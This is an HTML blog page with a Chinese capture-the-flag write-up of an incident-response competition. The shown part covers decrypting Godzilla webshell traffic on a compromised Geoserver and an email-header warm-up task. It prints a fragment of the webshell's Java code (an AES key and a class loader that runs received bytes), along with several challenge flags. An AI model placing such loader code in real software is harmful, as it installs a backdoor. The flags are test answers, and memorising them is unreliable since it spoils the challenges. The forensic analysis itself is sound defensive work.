@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="第一届solar应急响应比赛 复现日志流量日志流量11234题目文件：tomcat-wireshark.zip&#x2F;web新手运维小王的Geoserver遭到了攻击：黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。flag格式 flag&#123;xxxx&#125;  web目录，存在后门？那就用d盾扫    code是base64编码，怀疑是fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第一届solar应急响应-wp">
+<meta property="og:url" content="http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/index.html">
+<meta property="og:site_name" content="Meteor_Kai">
+<meta property="og:description" content="第一届solar应急响应比赛 复现日志流量日志流量11234题目文件：tomcat-wireshark.zip&#x2F;web新手运维小王的Geoserver遭到了攻击：黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。flag格式 flag&#123;xxxx&#125;  web目录，存在后门？那就用d盾扫    code是base64编码，怀疑是fl">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229094743847.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229095121947.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229095203297.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102503964.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102526760.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102614706.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102812837.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103101771.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103109050.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103208759.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103655329.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103829037.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110142358.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110211801.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110242420.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110352142.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229110908943.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111119862.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111344755.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111435871.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111637244.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111723222.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229111905095.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229112051539.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229112208817.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113321749.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113401080.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113532493.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229113556890.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229122231066.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229132342981.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229132335459.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229130911566.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229131325621.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229132651247.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229133350472.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229133446413.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229134458850.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229134531627.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229135320255.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229135841104.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229140034813.png">
+<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229140152237.png">
+<meta property="article:published_time" content="2024-12-29T06:11:18.000Z">
+<meta property="article:modified_time" content="2024-12-29T06:14:06.754Z">
+<meta property="article:author" content="Meteor_Kai">
+<meta property="article:tag" content="应急响应">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>第一届solar应急响应-wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About me</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&text=第一届solar应急响应-wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&is_video=false&description=第一届solar应急响应-wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=第一届solar应急响应-wp&body=Check out this article: http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&title=第一届solar应急响应-wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&name=第一届solar应急响应-wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://meteorkai.github.io/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/&t=第一届solar应急响应-wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%AF%94%E8%B5%9B-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">第一届solar应急响应比赛 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F"><span class="toc-number">1.1.</span> <span class="toc-text">日志流量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F1"><span class="toc-number">1.1.1.</span> <span class="toc-text">日志流量1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F2"><span class="toc-number">1.1.2.</span> <span class="toc-text">日志流量2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B5%81%E9%87%8F3"><span class="toc-number">1.1.3.</span> <span class="toc-text">日志流量3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81"><span class="toc-number">1.2.</span> <span class="toc-text">内存取证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">内存取证-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-2"><span class="toc-number">1.2.3.</span> <span class="toc-text">内存取证-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-3"><span class="toc-number">1.2.4.</span> <span class="toc-text">内存取证-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-4"><span class="toc-number">1.2.5.</span> <span class="toc-text">内存取证-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-5"><span class="toc-number">1.2.6.</span> <span class="toc-text">内存取证-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81-6"><span class="toc-number">1.2.7.</span> <span class="toc-text">内存取证-6</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">数据库-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">数据库-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-3"><span class="toc-number">1.3.3.</span> <span class="toc-text">数据库-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-4"><span class="toc-number">1.3.4.</span> <span class="toc-text">数据库-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-5"><span class="toc-number">1.3.5.</span> <span class="toc-text">数据库-5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%BA%94%E6%80%A5"><span class="toc-number">1.4.</span> <span class="toc-text">综合应急</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%BA%94%E6%80%A5-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">综合应急-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E5%BA%94%E6%80%A5-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">综合应急-2</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        第一届solar应急响应-wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Meteor_Kai</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-12-29T06:11:18.000Z" class="dt-published" itemprop="datePublished">2024-12-29</time>
+        
+        (Updated: <time datetime="2024-12-29T06:14:06.754Z" class="dt-updated" itemprop="dateModified">2024-12-29</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="第一届solar应急响应比赛-复现"><a href="#第一届solar应急响应比赛-复现" class="headerlink" title="第一届solar应急响应比赛 复现"></a>第一届solar应急响应比赛 复现</h1><h2 id="日志流量"><a href="#日志流量" class="headerlink" title="日志流量"></a>日志流量</h2><h3 id="日志流量1"><a href="#日志流量1" class="headerlink" title="日志流量1"></a>日志流量1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">黑客疑似删除了webshell后门，小王找到了可能是攻击痕迹的文件但不一定是正确的，请帮他排查一下。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>web目录，存在后门？那就用d盾扫</p>
+<img src="/2024/12/29/%E7%AC%AC%E4%B8%80%E5%B1%8Asolar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-wp/image-20241229094659560.png" class="" title="图片引用方法一">
+
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229094743847.png" alt="image-20241229094743847"></p>
+<p>code是base64编码，怀疑是flag，解码看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f!l^a*g&#123;A7b4_X9zK_2v8N_wL5q4&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="日志流量2"><a href="#日志流量2" class="headerlink" title="日志流量2"></a>日志流量2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，其中一个IP有访问webshell的流量，已提取部分放在了两个pcapng中了。请帮他解密该流量。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目1是后门嘛，那么密码，加密方式等肯定在里面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String code=<span class="string">&quot;ZiFsXmEqZ3tBN2I0X1g5ektfMnY4Tl93TDVxNH0=&quot;</span>; String xc=<span class="string">&quot;a2550eeab0724a69&quot;</span>; <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AES加密，密钥也给了a2550eeab0724a69</p>
+<p>这里先看流量包。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229095121947.png" alt="image-20241229095121947"></p>
+<p>不出意外这就是我们需要查看的流量了。b.jsp</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229095203297.png" alt="image-20241229095203297"></p>
+<p><strong>这里说一下如何判断哥斯拉流量特征：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://feifeitan.cn/index.php/archives/280/">https://feifeitan.cn/index.php/archives/280/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinat_31884905/article/details/132548617">https://blog.csdn.net/sinat_31884905/article/details/132548617</a></p>
+<p>具体可以看我的笔记。</p>
+<p>这里根据Cookie值最后出现了分号可以判断它是哥斯拉流量！！</p>
+<p>然后我们需要做的就是解密哥斯拉流量。</p>
+<p>发现这个流量的格式是raw的，很混淆，不是标准的base64，那么我们转换到原始数据，直接用cyberchef解密即可。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102503964.png" alt="image-20241229102503964"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102526760.png" alt="image-20241229102526760"></p>
+<p>密钥也有了，设置一下然后再接一个Gunzip即可。</p>
+<p>这要翻好久，终于翻到了一个flag.txt，readfile，那么flag可能就在请求包中！</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102614706.png" alt="image-20241229102614706"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229102812837.png" alt="image-20241229102812837"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;sA4hP_89dFh_x09tY_lL4SI4&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="日志流量3"><a href="#日志流量3" class="headerlink" title="日志流量3"></a>日志流量3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题目文件：tomcat-wireshark.zip/web</span><br><span class="line">新手运维小王的Geoserver遭到了攻击：</span><br><span class="line">小王拿到了当时被入侵时的流量，黑客疑似通过webshell上传了文件，请看看里面是什么。</span><br><span class="line">flag格式 flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure>
+
+<p>既然是上传文件，那么data肯定是很大的，小的就不用看了，看flag下面那个，有可能就是。</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103101771.png" alt="image-20241229103101771"></p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103109050.png" alt="image-20241229103109050"></p>
+<p>flag.pdf，再转变为ascii看仔细点</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103208759.png" alt="image-20241229103208759"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">application/octet-stream</span><br></pre></td></tr></table></figure>
+
+<p>那应该就是上传flag.pdf文件了！接下来我们需要导出它！</p>
+<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103655329.png" alt="image-20241229103655329"></p>
+<p>导出为pdf文件然后解压即可。</p>
+<p>这里有点奇怪，不应该导出为gz然后解压出pdf嘛？但是我直接导出为pdf就行了。。</p>
+<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241229103829037.png" alt="image-20241229103829037" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dD7g_jk90_jnVm_aPkcs&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">本题作为签到题,请给出邮服发件顺序。</span><br><span class="line"></span><br><span class="line">Received: from mail.da4s8gag.com ([140.143.207.229])</span><br><span class="line">by newxmmxszc6-1.qq.com (NewMX) with SMTP id 6010A8AD</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">X-QQ-mid: xmmxszc6-1t1729135441tm9qrjq3k</span><br><span class="line">X-QQ-XMRINFO: NgToQqU5s31XQ+vYT/V7+uk=</span><br><span class="line">Authentication-Results: mx.qq.com; spf=none smtp.mailfrom=;</span><br><span class="line">dkim=none; dmarc=none(permerror) header.from=solar.sec</span><br><span class="line"></span><br><span class="line">Received: from mail.solar.sec (VM-20-3-centos [127.0.0.1])</span><br><span class="line">by mail.da4s8gag.com (Postfix) with ESMTP id 2EF0A60264</span><br><span class="line">for ; Thu, 17 Oct 2024 11:24:01 +0800 (CST)</span><br><span class="line">Date: Thu, 17 Oct 2024 11:24:01 +0800</span><br><span class="line">To: hellosolartest@qq.com</span><br><span class="line"></span><br><span class="line">From: 鍏嬪競缃戜俊</span><br><span class="line">Subject:xxxxxxxxxx</span><br><span class="line">Message-Id: &lt;20241017112401.032146@mail.solar.sec&gt;</span><br><span class="line">X-Mailer: QQMail 2.x</span><br><span class="line"></span><br><span class="line">XXXXXXXXXX</span><br><span class="line"></span><br><span class="line">flag格式为flag&#123;domain1|...|domainN&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mail.solar.sec|mail.da4s8gag.com|newxmmxszc6-1.qq.com&#125;</span><br></pre></td></tr></table></figure>
+
+
+
